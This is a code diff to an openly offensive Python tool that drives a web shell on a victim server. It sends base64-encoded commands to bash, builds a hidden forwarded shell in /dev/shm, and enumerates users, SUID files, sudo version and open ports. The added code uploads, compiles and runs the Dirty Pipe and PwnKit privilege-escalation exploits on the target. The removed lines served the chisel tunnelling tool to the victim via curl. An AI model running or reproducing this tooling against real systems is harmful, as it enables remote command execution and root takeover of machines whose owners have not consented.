@@ -5,10 +5,11 @@ import requests
 import threading
 import signal
 import sys
+import time
 import argparse
+import subprocess
 from base64 import b64encode
 from random import randrange
-from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 # ------------------------------------
 # Github: https://github.com/D3Ext
@@ -25,11 +26,8 @@ mybanner = '''\n              /\                               ______,....----,
               \/'''
 
 # Global Variables
-global infile, outfile, local_http_port, server, local_ip
-local_ip="127.0.0.1"
+global infile, outfile, mod
 mod = randrange(1, 9999)
-local_http_port = randrange(40000, 50000)
-server = HTTPServer(('localhost', local_http_port), SimpleHTTPRequestHandler)
 infile = f"/dev/shm/.fs/input.{mod}"
 outfile = f"/dev/shm/.fs/output.{mod}"
 
@@ -48,7 +46,6 @@ class c:
 def exit_handler(sig, frame):
 	print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
 	removeFiles(url, parameter)
-	server.shutdown()
 	sys.exit(0)
 
 signal.signal(signal.SIGINT, exit_handler)
@@ -82,13 +79,6 @@ def checkConn(url):
 		print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
 		sys.exit(0)
 
-# To forward a port to your localhost
-def createHttp():   
-	
-    thread = threading.Thread(target = server.serve_forever)
-    thread.daemon = True
-    thread.start()
-	
 # Function to create the fifos on the victim (to have an interactive tty)
 def createFifos(url, parameter):
 	
@@ -148,7 +138,68 @@ def execCommand(url, parameter, command):
 		f"{parameter}": f'echo "{base64command}" | base64 -d > {infile}'
 	}
 
-	r = requests.post(url, data=rce_data)
+	r = requests.post(url, data=rce_data, timeout=10)
+
+# Function to launch some privesc exploits
+def tryExploits(url, parameter):
+    
+    bins = checkBinaries(url, parameter)
+    if "gcc" not in bins:
+        print(c.BLUE + "\ngcc not found in target system\n" + c.END)
+
+    else:
+        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Uploading and compiling exploits" + c.END)
+
+        exploit_content = open("exploits/cve-2022-0847.c", "r").read()
+        base64exploit = b64encode(exploit_content.encode()).decode()
+        command_to_exec = f"""echo {base64exploit} | base64 -d > /dev/shm/.fs/cve-2022-0847.c"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        exploit_content = open("exploits/cve-2021-4034.c", "r").read()
+        base64exploit = b64encode(exploit_content.encode()).decode()
+        command_to_exec = f"""echo {base64exploit} | base64 -d > /dev/shm/.fs/cve-2021-4034.c"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        command_to_exec = """gcc /dev/shm/.fs/cve-2022-0847.c -o /dev/shm/.fs/cve-2022-0847"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        command_to_exec = """gcc /dev/shm/.fs/cve-2021-4034.c -o /dev/shm/.fs/cve-2021-4034"""
+        execCommand(url, parameter, command_to_exec + "\n")
+ 
+        command_to_exec = """chmod +x /dev/shm/.fs/cve-2022-0847"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        command_to_exec = """chmod +x /dev/shm/.fs/cve-2021-4034"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Executing exploits" + c.END)
+        time.sleep(0.5)
+        print(c.BLUE + "\nExecuting Dity Pipe exploit" + c.END)
+        command_to_exec = """/dev/shm/.fs/cve-2022-0847"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        resp = readCommand(url, parameter)
+        print(resp)
+        clearOutput(url, parameter)
+
+        print(c.BLUE + "\nExecuting pwnkit exploit" + c.END)
+        command_to_exec = """/dev/shm/.fs/cve-2021-4034"""
+        execCommand(url, parameter, command_to_exec + "\n")
+
+        resp = readCommand(url, parameter)
+        print(resp)
+        clearOutput(url, parameter)
+        
+# Function to execute especial commands without the fifos and returning them
+def execCustomCommand(url, parameter, command):
+    base64command = b64encode(command.encode()).decode()
+
+    rce_data = {
+        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+    }
+
+    r = requests.post(url, data=rce_data, timeout=10)
+    return r.text
 
 # Function to check useful binaries on the victim
 def checkBinaries(url, parameter):
@@ -159,102 +210,47 @@ def checkBinaries(url, parameter):
 		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
 	}
 
-	r = requests.post(url, data=enum_data)
+	r = requests.post(url, data=enum_data, timeout=8)
 	return r.text
 
 # Function to enumerate the system
 def enumSys(url, parameter):
     raw_command = """whoami"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=enum_data, timeout=2)
-    user = r.text
+    user = execCustomCommand(url, parameter, raw_command)
 
     raw_command = """hostname"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=enum_data, timeout=2)
-    hostname = r.text
+    hostname = execCustomCommand(url, parameter, raw_command)
 
     raw_command = """hostname -I"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=enum_data, timeout=2)
-    ip = r.text
+    ip = execCustomCommand(url, parameter, raw_command)
 
     raw_command = """uname -a"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }	
-
-    r = requests.post(url, data=enum_data, timeout=2)
-    uname = r.text
+    uname = execCustomCommand(url, parameter, raw_command)
 
     raw_command = """id"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=enum_data, timeout=2)
-    id_output = r.text
+    id_output = execCustomCommand(url, parameter, raw_command)
 
     raw_command = """ls /home"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=enum_data, timeout=2)
-    users = r.text
+    users = execCustomCommand(url, parameter, raw_command)
     users = users.strip('\n').replace('\n', ', ')
     
     raw_command = """echo $PATH"""
-    base64command = b64encode(raw_command.encode()).decode()
+    path = execCustomCommand(url, parameter, raw_command)
 
-    enum_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
+    raw_command = """sudo --version 2>/dev/null | head -n 1 | awk '{print $NF}'"""
+    sudo_version = execCustomCommand(url, parameter, raw_command)
 
-    r = requests.post(url, data=enum_data, timeout=2)
-    path = r.text
+    return user, hostname, ip, uname, id_output, users, path, sudo_version
 
-    return user, hostname, ip, uname, id_output, users, path
+# Function to get the user and the hostname to create a realist shell
+def getUserHostname(url, parameter):
+    raw_command = """whoami"""
+    user = execCustomCommand(url, parameter, raw_command)
 
-def downloadChisel(url, parameter):
-    raw_command = f"""curl http://{local_ip}:{local_http_port}/utils/chisel -o /dev/shm/.fs/chisel"""
-    base64command = b64encode(raw_command.encode()).decode()
+    raw_command = """hostname"""
+    hostname = execCustomCommand(url, parameter, raw_command)
 
-    download_data = {
-            f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=download_data, timeout=4)
-
-    raw_command = """chmod +x /dev/shm/.fs/chisel"""
-    base64command = b64encode(raw_command.encode()).decode()
-
-    download_data = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
-
-    r = requests.post(url, data=download_data, timeout=4)
+    return user, hostname
 
 # Main Function
 if __name__ == '__main__':
@@ -270,16 +266,15 @@ if __name__ == '__main__':
 
     # Check connection to the web shell
     checkConn(url)
-    createHttp()
 	
     # Create an interactive shell
     createFifos(url, parameter)
     print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system info" + c.END)
-    user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
+    user, hostname = getUserHostname(url, parameter)
 
     print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)
     
-    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-forward", "forward-dfs"]
+    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits"]
     # Loop to execute commands
     while True:
         if user == "root":
@@ -290,32 +285,51 @@ if __name__ == '__main__':
         if command_to_exec == "dfs-help" or command_to_exec == "help-dfs":
             print(c.YELLOW + "\nCommands\t\tDescription" + c.END)
             print(c.YELLOW + "--------\t\t-----------" + c.END)
-            print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups...)" + c.END)
-            print(c.BLUE + "dfs-binaries\t\tsearch common useful binaries that can be used in the pentest" + c.END)
+            print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups, system info...)" + c.END)
+            print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used in the pentest" + c.END)
+            print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pnwkit, dirty pipe)" + c.END)
             print(c.BLUE + "dfs-exit\t\texit from the forwarded shell and delete created files on the target" + c.END)
-            print(c.BLUE + "dfs-forward\t\tforwards a intern port of the target to your machine (not implemented yet)\n" + c.END)
 
         if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
             print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Enumerating system, please wait a few seconds" + c.END)
-            user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
+            user, hostname, ip, uname, id_output, users, path, sudo_version = enumSys(url, parameter)
+            
+            raw_command = """find / \-perm -4000 2>/dev/null"""
+            suid = execCustomCommand(url, parameter, raw_command)
+
             print(c.YELLOW + "\nInformation" + c.END)
             print(c.YELLOW + "-----------" + c.END)
-            print(c.BLUE + "User: " + user.strip('\n') + c.END)
+            print(c.BLUE + "Current user: " + user.strip('\n') + c.END)
             print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
             print(c.BLUE + "Path: " + path.strip('\n') + c.END)
             print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
             print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
             print(c.BLUE + "Users in /home: " + users + c.END)
+            if sudo_version:
+                print(c.BLUE + "Sudo version: " + sudo_version.strip('\n') + c.END)
+            else:
+                print(c.BLUE + "Sudo version: Not found" + c.END)
             print(c.BLUE + "System info: " + uname + c.END) 
+            print(c.YELLOW + "SUID Files" + c.END)
+            print(c.YELLOW + "----------" + c.END)
+            print(c.BLUE + suid + c.END)
 
+            raw_command = """cat /proc/net/tcp | grep -v "sl" | awk '{print $3}' FS=":" | awk '{print $1}' | sort -u"""
+            hex_ports = execCustomCommand(url, parameter, raw_command)
+
+            print(c.YELLOW + "Local ports" + c.END)
+            print(c.YELLOW + "----------" + c.END)
+            for port in hex_ports.strip('\n').split('\n'):
+                print(c.BLUE + str(int(port, 16)) + c.END)
+            
         if command_to_exec == "dfs-binaries" or command_to_exec == "binaries-dfs":
             binList = checkBinaries(url, parameter)
             print(c.YELLOW + "\nUseful binaries" + c.END)
             print(c.YELLOW + "---------------" + c.END)
-            print(c.BLUE + binList.strip('\n') + c.END)
+            print(c.BLUE + binList.strip('\n').strip('\n') + c.END)
 
-        if command_to_exec == "dfs-forward" or command_to_exec == "forward-dfs":
-            print("not implemented yet\n")
+        if command_to_exec == "dfs-exploit" or command_to_exec == "exploit-dfs":
+            tryExploits(url, parameter)
 
         if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
             removeFiles(url, parameter)
